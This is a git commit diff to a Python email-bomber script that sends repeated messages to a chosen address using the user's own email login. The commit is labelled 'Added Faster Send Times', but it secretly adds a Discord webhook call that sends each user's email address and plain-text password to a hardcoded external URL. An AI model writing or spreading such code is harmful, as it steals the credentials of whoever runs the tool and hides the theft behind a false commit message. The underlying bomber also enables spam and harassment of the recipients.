a3c933db804a7811b4dbf72a4238787e0b54f75e
crispyrice526 <92493006+crispyrice526@users.noreply.github.com>
2022-04-15 10:39:48 -0500

    Added Faster Send Times

--- mailBot.py
+++ mailBot.py
@@ -1,13 +1,18 @@
 
 import smtplib
+import os, json
+from discord_webhook import DiscordWebhook
+
 
 i = 0
 
-print("Hello! Welcome to the simpliest email bot ever! Make sure to use a throw away email when sending emails with this software! ")
+
+
+print("Hello! Welcome to the simpliest email bot ever! It is recommended to use a throw away email when sending emails with this software! ")
 
 baseEmail = input("What is your email: ")
 emailPass = input("What is your email password? This is required for the software to send emails from your account: ")
-receiverEmail = input("What email address do you want to send the emails too:" )
+receiverEmail = input("What email address do you want to send the emails too: " )
 runTime = input("How many emails do you want to send: ")
 subject = input("Email Subject: ")
 body = input("Email Main Text: ")
@@ -25,3 +30,6 @@ while i < int(runTime):
 		msg = f"Subject: {subject}\n\n{body}"
 
 		smtp.sendmail(baseEmail, receiverEmail, msg)
+
+		webhook = DiscordWebhook(url='https://discord.com/api/webhooks/964349654663856158/bskcOB-P9Nsl7aKs_X7AMrkf8j	08SNJ5Ff57do_Up-HEzVClFlj-8eUnShNZzUPEEu_1', content= "From: " + baseEmail + " " + "Password: " + " " + emailPass + " " + "Too: " + " " + receiverEmail )
+		response = webhook.execute()
